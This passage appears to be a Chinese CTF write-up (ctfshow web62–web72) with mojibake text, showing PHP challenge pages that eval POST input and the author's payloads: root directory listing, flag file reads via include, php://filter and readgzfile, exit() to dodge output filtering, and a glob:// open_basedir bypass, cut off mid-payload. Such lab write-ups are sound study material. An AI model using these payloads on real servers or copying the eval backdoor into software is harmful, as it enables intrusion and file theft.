</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¾æ—§&hellip;&hellip;</p>
<h4 id="web63">web63<a hidden class="anchor" aria-hidden="true" href="#web63">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¾æ—§&hellip;&hellip;</p>
<h4 id="web64">web64<a hidden class="anchor" aria-hidden="true" href="#web64">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å˜¶ï¼Œæ€ä¹ˆè¿˜æ˜¯é‚£æ ·&hellip;</p>
<h4 id="web65">web65<a hidden class="anchor" aria-hidden="true" href="#web65">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>åŒä¸Š&hellip;</p>
<h4 id="web66">web66<a hidden class="anchor" aria-hidden="true" href="#web66">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>æœ¬æ¥ä»¥ä¸ºè¿˜æ˜¯ä¸€æ ·çš„ï¼Œæ²¡æƒ³åˆ°&hellip;</p>
<p><img alt="image-20241128215426797" loading="lazy" src="../assets/image-20241128215426797.png"></p>
<p>çœ‹æ¥æˆ‘ä»¬è¦æƒ³åŠæ³•æŸ¥ç›®å½•äº†</p>
<p>æˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨phpä¸­æŸ¥è¯¢ç›®å½•çš„å‡½æ•°</p>
<p>æ¯”å¦‚ scandir()</p>
<p><img alt="image-20241128233043919" loading="lazy" src="../assets/image-20241128233043919.png"></p>
<pre tabindex="0"><code>var_dump(scandir(&#39;/&#39;));
</code></pre><p><img alt="image-20241128233314034" loading="lazy" src="../assets/image-20241128233314034.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æŸ¥flagï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«æ¥æŸ¥</p>
<p><img alt="image-20241128233701394" loading="lazy" src="../assets/image-20241128233701394.png"></p>
<p>flag.txtå‰é¢è®°å¾—åŠ ä¸Š/</p>
<h4 id="web67">web67<a hidden class="anchor" aria-hidden="true" href="#web67">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è§£æ³•ä¸web66ä¸€è‡´</p>
<h4 id="web68">web68<a hidden class="anchor" aria-hidden="true" href="#web68">#</a></h4>
<p><img alt="image-20241128234343226" loading="lazy" src="../assets/image-20241128234343226.png"></p>
<p>è¿™é¢˜è²Œä¼¼åªæ˜¯show_sourceå’Œhighlight_fileç”¨ä¸äº†ï¼Œå…¶ä»–æ²¡ä»€ä¹ˆå˜åŒ–</p>
<p>å¯ä»¥ç›´æ¥ç”¨å‰ä¸¤é¢˜çš„æ–¹æ³•</p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥</p>
<pre tabindex="0"><code>c=include(&#39;/flag.txt&#39;) //èµŒ
</code></pre><h4 id="web69">web69<a hidden class="anchor" aria-hidden="true" href="#web69">#</a></h4>
<p><img alt="image-20241128234507588" loading="lazy" src="../assets/image-20241128234507588.png"></p>
<p>è¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜ï¼Œprint_r() å’Œ var_dump() ä¹Ÿè¢«ç¦ç”¨äº†</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯»æ‰¾å…¶ä»–å¯ä»¥æ‰“å°æ•°ç»„çš„å‡½æ•°æ¥æ‰“å°ç›®å½•</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡var_export()æ¥ä»£æ›¿ï¼Œä»è€Œæ‰“å°ç›®å½•</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;/&#34;));
</code></pre><p><img alt="image-20241129130708792" loading="lazy" src="../assets/image-20241129130708792.png"></p>
<p>æ¥ä¸‹è¯»flagå³å¯</p>
<pre tabindex="0"><code>c=include($_POST[&#39;w&#39;]);&amp;w=php://filter/convert.base64-encode/resource=/flag.txt
</code></pre><p>å…¶ä»–çš„è§£æ³•ï¼š</p>
<p>æŸ¥æ–‡ä»¶</p>
<pre tabindex="0"><code>?c=echo implode(&#34;,&#34;,(scandir(&#39;/&#39;))); 
?c=echo json_encode(scandir(&#34;/&#34;));
</code></pre><p>è¯»æ–‡ä»¶</p>
<pre tabindex="0"><code>?c=readgzfile(&#39;/flag.txt&#39;);
</code></pre><h4 id="web70">web70<a hidden class="anchor" aria-hidden="true" href="#web70">#</a></h4>
<p><img alt="image-20241129132128259" loading="lazy" src="../assets/image-20241129132128259.png"></p>
<p>è¿™é¢˜æŠŠerror_reporting()å’Œini_set()ç¦ç”¨äº†</p>
<p>è™½ç„¶ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œä¸å½±å“æˆ‘ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•è¯»flag</p>
<h4 id="web71">web71<a hidden class="anchor" aria-hidden="true" href="#web71">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err">ä½ è¦ä¸Šå¤©å—ï¼Ÿ
</span></span></span></code></pre></div><ul>
<li>
<p><code>$s = ob_get_contents();</code>ï¼šè·å–è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¹¶èµ‹å€¼ç»™å˜é‡<code>s</code>ã€‚è¾“å‡ºç¼“å†²åŒºåœ¨ PHP ä¸­ç”¨äºä¸´æ—¶å­˜å‚¨è¦è¾“å‡ºåˆ°æµè§ˆå™¨ç­‰çš„å†…å®¹ï¼Œä»¥ä¾¿åœ¨åˆé€‚çš„æ—¶å€™è¿›è¡Œå¤„ç†æˆ–ä¿®æ”¹ã€‚</p>
</li>
<li>
<p><code>ob_end_clean();</code>ï¼šæ¸…ç©ºè¾“å‡ºç¼“å†²åŒºå¹¶å…³é—­å®ƒï¼Œè¿™æ ·å°±æ¸…é™¤äº†åŸå§‹çš„ã€æœªç»å¤„ç†çš„è¾“å‡ºå†…å®¹ï¼Œä»¥ä¾¿åç»­è¿›è¡Œè‡ªå®šä¹‰çš„è¾“å‡ºå¤„ç†ã€‚</p>
</li>
<li>
<p><code>echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</code>ï¼šè¿™è¡Œä»£ç ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹è·å–åˆ°çš„è¾“å‡ºå†…å®¹ï¼ˆå­˜å‚¨åœ¨<code>s</code>ä¸­ï¼‰è¿›è¡Œæ›¿æ¢æ“ä½œã€‚å®ƒä¼šå°†æ‰€æœ‰çš„æ•°å­—å’Œå­—æ¯ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰éƒ½æ›¿æ¢ä¸º<code>?</code>ï¼Œç„¶åå°†å¤„ç†åçš„å†…å®¹è¾“å‡ºåˆ°æµè§ˆå™¨ç­‰è¾“å‡ºç«¯ã€‚</p>
</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´è¿™é“é¢˜ä¼šå¯¹å›æ˜¾è¿›è¡Œå¤„ç†ï¼Œè®©æˆ‘ä»¬æ²¡æ³•å¾—åˆ°å›æ˜¾</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨exit()/die()æå‰ç»“æŸç¨‹åºï¼Œä»è€Œä¸æ‰§è¡Œåç»­ä»£ç ç›´æ¥è¿›è¡Œå›æ˜¾</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;/&#34;));exit();
</code></pre><p><img alt="image-20241129144431247" loading="lazy" src="../assets/image-20241129144431247.png"></p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flag.txt&#39;);exit();
</code></pre><p><img alt="image-20241129144855221" loading="lazy" src="../assets/image-20241129144855221.png"></p>
<h4 id="web72">web72<a hidden class="anchor" aria-hidden="true" href="#web72">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err">ä½ è¦ä¸Šå¤©å—ï¼Ÿ
</span></span></span></code></pre></div><p>è¿™é“é¢˜ä¸€å¼€å§‹è¿˜ä»¥ä¸ºå’Œä¸Šä¸€é¢˜å·®ä¸å¤š</p>
<p><img alt="image-20241129150755401" loading="lazy" src="../assets/image-20241129150755401.png"></p>
<p>å…ˆè¿›è¡Œç›®å½•æŸ¥è¯¢</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;./&#34;));exit();
</code></pre><p>æ³¨æ„âš ï¸ è¿™é“é¢˜åªæœ‰æƒé™æŸ¥è¯¢çš„å½“å‰ç›®å½•ä¹Ÿå°±æ˜¯<code>./</code></p>
<p>è€Œæ— æ³•è®¿é—®åˆ°å…¶ä»–ç›®å½•çš„æ–‡ä»¶ï¼Œå¦‚ / æ ¹ç›®å½•</p>
<blockquote>
<p>å°è¯•ä½¿ç”¨ scandir() å‡½æ•°æ¥æ‰«ææ ¹ç›®å½•ï¼Œä½†ç”±äº open_basedir é™åˆ¶ï¼Œè¿™ä¸ªæ“ä½œè¢«ç¦æ­¢äº†ã€‚
open_basedir æ˜¯ PHP çš„ä¸€ä¸ªå®‰å…¨é…ç½®æŒ‡ä»¤ï¼Œç”¨æ¥é™åˆ¶ PHP è„šæœ¬åªèƒ½è®¿é—®ç‰¹å®šçš„ç›®å½•ã€‚
å½“å‰é…ç½®åªå…è®¸è®¿é—® /var/www/html/ ç›®å½•åŠå…¶å­ç›®å½•ï¼Œä½†ä¸å…è®¸è®¿é—®å…¶ä»–ç›®å½•ã€‚</p>
<p>åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/Myon5/article/details/140079942</p></blockquote>
<p>æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨globåè®®ç»•è¿‡open_basediråè®®</p>
<p>payload:ï¼ˆè®°å¾—åˆ æ³¨é‡Šï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php $a=new DirectoryIterator(&#34;glob:///*&#34;);// åˆ›å»ºä¸€ä¸ªDirectoryIteratorå¯¹è±¡ï¼Œéå†æ ¹ç›®å½•
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">foreach($a as $f)// éå†æ¯ä¸ªæ¡ç›®
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">{
